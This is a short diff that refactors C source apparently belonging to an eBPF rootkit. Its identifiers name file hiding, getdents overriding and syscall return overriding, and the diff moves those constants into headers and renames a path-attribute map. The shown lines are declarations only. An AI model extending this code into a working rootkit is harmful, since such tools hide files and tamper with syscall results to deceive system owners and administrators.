@@ -10,17 +10,8 @@
 #include "include/bpf.h"
 #include "include/bpf_helpers.h"
 
-#define MAX_SEGMENT_LENGTH 32
-#define FILL_WITH_ZERO_PROG 10
-#define OVERRIDE_GET_DENTS_PROG 11
-
-enum
-{
-    KMSG_ACTION = 1,
-    OVERRIDE_CONTENT_ACTION,
-    OVERRIDE_RETURN_ACTION,
-    HIDE_FILE_ACTION,
-};
+#include "defs.h"
+#include "hash.h"
 
 struct bpf_map_def SEC("maps/rk_progs") rk_progs = {
     .type = BPF_MAP_TYPE_PROG_ARRAY,
@@ -90,7 +81,7 @@ struct rk_path_attr_t
     struct rk_action_t action;
 };
 
-struct bpf_map_def SEC("maps/rk_path_keys") rk_path_keys = {
+struct bpf_map_def SEC("maps/rk_path_attrs") rk_path_attrs = {
     .type = BPF_MAP_TYPE_HASH,
     .key_size = sizeof(struct rk_path_key_t),
     .value_size = sizeof(struct rk_path_attr_t),
